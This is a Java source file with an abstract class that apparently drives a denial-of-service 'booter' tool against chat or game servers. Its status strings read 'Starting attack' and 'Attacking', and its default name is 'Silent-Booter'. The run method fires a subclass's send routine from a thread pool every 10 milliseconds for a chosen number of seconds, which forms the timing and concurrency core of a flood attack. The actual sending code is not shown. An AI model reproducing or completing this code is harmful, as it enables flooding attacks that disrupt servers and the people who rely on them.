package me.pk2.chatserver.container;

import static me.pk2.chatserver.util.LastStorage.*;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public abstract class Container {
    private AtomicBoolean running = new AtomicBoolean(false);
    private ExecutorService executorService;

    public final String name;
    public Container(String name) {
        this.name = name;
    }

    public abstract void sendTick(String x0, int x1, String x2, int x3, int x4);
    private final void sendTickThread() { sendTick(y0, y2, y1, y3, y4); }

    public AtomicReference<String> status = new AtomicReference<>("Idle");

    public final void run(String x0, int x1, String x2, int x3, int x4) {
        this.running.set(true);
        this.status.set("Starting attack");
        this.executorService = Executors.newFixedThreadPool(x4);

        y0 = x0;
        y1 = x2;
        y2 = x1;
        y3 = x3;
        y4 = x4;

        this.status.set("Attacking");
        long expires = x3*1000+System.currentTimeMillis();
        while(expires>System.currentTimeMillis()) {
            for(int i = 0; i < x4; i++)
                executorService.submit(() -> sendTickThread());

            try { Thread.sleep(10); } catch (Exception exception) { }
        }

        this.status.set("Shutting down executor");
        executorService.shutdownNow();

        this.status.set("Idle");
        this.running.set(false);
    }
    public final void run(String x0, int x1, int x2, int x3) { run(x0, x1, "Silent-Booter", x2, x3); }
    public final boolean isBusy() { return running.get(); }
}